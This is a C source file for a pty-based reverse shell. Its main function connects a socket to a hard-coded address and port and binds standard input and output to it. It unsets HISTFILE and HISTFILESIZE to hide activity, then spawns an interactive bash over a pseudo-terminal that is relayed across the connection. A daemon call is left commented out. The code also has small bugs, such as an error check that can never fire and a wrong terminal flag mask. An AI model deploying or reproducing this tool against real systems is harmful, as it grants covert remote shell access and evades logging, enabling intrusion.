#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <termios.h>
#include <error.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/ioctl.h>


int
ptym_open(char *pts_name, int pts_namesz)
{
    char	*ptr;
    int		fdm, err;

    if ((fdm = posix_openpt(O_RDWR)) < 0)
        return(-1);
    if (grantpt(fdm) < 0)		/* grant access to slave */
        goto errout;
    if (unlockpt(fdm) < 0)		/* clear slave's lock flag */
        goto errout;
    if (ptsname_r(fdm, pts_name, pts_namesz) != 0)	/* get slave's name */
        goto errout;

    /*
     * Return name of slave.  Null terminate to handle
     * case where strlen(ptr) > pts_namesz.
     */
  //  strncpy(pts_name, ptr, pts_namesz);
   // pts_name[pts_namesz - 1] = '\0';
    return(fdm);			/* return fd of master */
errout:
    err = errno;
    close(fdm);
    errno = err;
    return(-1);
}

int
ptys_open(char *pts_name)
{
    int fds;
#if defined(SOLARIS)
    int err, setup;
#endif

    if ((fds = open(pts_name, O_RDWR)) < 0)
        return(-1);

#if defined(SOLARIS)
    /*
     * Check if stream is already set up by autopush facility.
     */
    if ((setup = ioctl(fds, I_FIND, "ldterm")) < 0)
        goto errout;

    if (setup == 0) {
        if (ioctl(fds, I_PUSH, "ptem") < 0)
            goto errout;
        if (ioctl(fds, I_PUSH, "ldterm") < 0)
            goto errout;
        if (ioctl(fds, I_PUSH, "ttcompat") < 0) {
errout:
            err = errno;
            close(fds);
            errno = err;
            return(-1);
        }
    }
#endif
    return(fds);
}


id_t
pty_fork(int *ptrfdm, char *slave_name, int slave_namesz,
         const struct termios *slave_termios,
         const struct winsize *slave_winsize)
{
    int		fdm, fds;
    pid_t	pid;
    char	pts_name[20];

    if ((fdm = ptym_open(pts_name, sizeof(pts_name))) < 0)
        fprintf(stderr,"can't open master pty: %s, error %d", pts_name, fdm);

    if (slave_name != NULL) {
        /*
         * Return name of slave.  Null terminate to handle case
         * where strlen(pts_name) > slave_namesz.
         */
        strncpy(slave_name, pts_name, slave_namesz);
        slave_name[slave_namesz - 1] = '\0';
    }

    if ((pid = fork()) < 0) {
        return(-1);
    } else if (pid == 0) {		/* child */
        if (setsid() < 0)
            perror("setsid error");

        /*
         * System V acquires controlling terminal on open().
         */
        if ((fds = ptys_open(pts_name)) < 0)
            perror("can't open slave pty");
        close(fdm);		/* all done with master in child */

#if	defined(BSD)
        /*
         * TIOCSCTTY is the BSD way to acquire a controlling terminal.
         */
        if (ioctl(fds, TIOCSCTTY, (char *)0) < 0)
            err_sys("TIOCSCTTY error");
#endif
        /*
         * Set slave's termios and window size.
         */
        if (slave_termios != NULL) {
            if (tcsetattr(fds, TCSANOW, slave_termios) < 0)
                perror("tcsetattr error on slave pty");
        }
        if (slave_winsize != NULL) {
            if (ioctl(fds, TIOCSWINSZ, slave_winsize) < 0)
                perror("TIOCSWINSZ error on slave pty");
        }

        /*
         * Slave becomes stdin/stdout/stderr of child.
         */
        if (dup2(fds, STDIN_FILENO) != STDIN_FILENO)
            perror("dup2 error to stdin");
        if (dup2(fds, STDOUT_FILENO) != STDOUT_FILENO)
            perror("dup2 error to stdout");
        if (dup2(fds, STDERR_FILENO) != STDERR_FILENO)
            perror("dup2 error to stderr");
        if (fds != STDIN_FILENO && fds != STDOUT_FILENO &&
          fds != STDERR_FILENO)
            close(fds);
        return(0);		/* child returns 0 just like fork() */
    } else {					/* parent */
        *ptrfdm = fdm;	/* return fd of master */
        return(pid);	/* parent returns pid of child */
    }
}


ssize_t
writen(int fd, const void *ptr, size_t n)
{
    size_t		nleft;
    ssize_t		nwritten;

    nleft = n;
    while (nleft > 0) {
        if ((nwritten = write(fd, ptr, nleft)) < 0) {
            if (nleft == n)
                return(-1); /* error, return -1 */
            else
                break;      /* error, return amount written so far */
        } else if (nwritten == 0) {
            break;
        }
        nleft -= nwritten;
        ptr   += nwritten;
    }
    return(n - nleft);      /* return >= 0 */
}



void setraw(int fd)
{
    struct termios term;
    int err;
    if (tcgetattr(fd, &term) == -1){
        perror("error");
        return;
    }
    term.c_iflag = term.c_iflag & (BRKINT | ICRNL | INPCK | ISTRIP | IXON);
    term.c_oflag = term.c_oflag & ~(OPOST);
    term.c_cflag = term.c_cflag & ~(CSIZE | PARENB);
    term.c_cflag = term.c_cflag | CS8;
    term.c_lflag = term.c_lflag & ~(ECHO | ICANON | IEXTEN | ISIG);
    term.c_cc[VMIN] = 1;
    term.c_cc[VTIME] = 0;
    err = tcsetattr(fd, TCSAFLUSH, &term);
    if (err == -1 && err == EINTR){
        perror("set error");
        return;
    }
    
}
void setcbreak(int fd)
{
    struct termios term;
    int err;
    if (tcgetattr(fd, &term) == -1){
        perror("error");
        return;
    }
    term.c_lflag = term.c_lflag & ~(ECHO | ICANON);
    term.c_cc[VMIN] = 1;
    term.c_cc[VTIME] = 0;
    err = tcsetattr(fd, TCSAFLUSH, &term);
    if (err == -1 && err == EINTR){
        perror("set error");
        return;
    }
}

void loop(int mfd)
{

    char buf[1024];

    while(1){
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(STDIN_FILENO, &rfds);
        FD_SET(mfd, &rfds);
        int maxfd = mfd > STDIN_FILENO ? mfd + 1 : STDIN_FILENO + 1;
        int ret = select(maxfd, &rfds, NULL, NULL, NULL);
        if (ret == -1){
            fprintf(stderr, "select error");
            break;
        }else if(ret){
            if(FD_ISSET(mfd, &rfds)){
                ssize_t len = read(mfd, buf, 1024);
                if (len == 0){
                    FD_CLR(mfd, &rfds);
                }else{
                    writen(STDOUT_FILENO, buf, len);
                }
            }
            if(FD_ISSET(STDIN_FILENO, &rfds)){
                ssize_t len = read(STDIN_FILENO, buf, 1024);
                if (len == 0){
                    FD_CLR(STDIN_FILENO, &rfds);
                }else{
                    writen(mfd, buf, len);
                }
            }
        }
    }

}
void spawn(int sock)
{
    pid_t pid;
    int mfd;
    int err;
    struct termios old_term;
    int restore=0;
    //pid = forkpty(&mfd, NULL, NULL, NULL);
    pid = pty_fork(&mfd, NULL, 0, NULL, NULL);

    if( pid == -1){
        fprintf(stderr, "fork pty error\r\n");
        exit(-1);
    }else if ( pid == 0 ){ //child

   //     execlp("/bin/bash", "bash", NULL);
        if (execl("/bin/bash", "/bin/bash", "-i", NULL) < 0){
            exit(-2);
        }
    }
    if (tcgetattr(STDIN_FILENO, &old_term) != -1){
        restore = 1;
        setraw(STDIN_FILENO);
    }
    loop(mfd);
    if(restore){
        err = tcsetattr(STDIN_FILENO, TCSAFLUSH, &old_term);
        if (err == -1 && err == EINTR){
            perror("set error");
            exit(-1);
        }
    }
    close(mfd);
}

int main(void) {
    //daemon(1, 0);
    

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr = {0};
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(1234);
    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    if(0 != connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)))
        _exit(0);


    close(STDOUT_FILENO);
    dup2(sock, STDOUT_FILENO);

    close(STDIN_FILENO);
    dup2(sock, STDIN_FILENO);

    close(STDERR_FILENO);
    dup2(sock, STDERR_FILENO);

    unsetenv("HISTFILE");
    unsetenv("HISTFILESIZE");
    spawn(sock);
    close(sock);

}
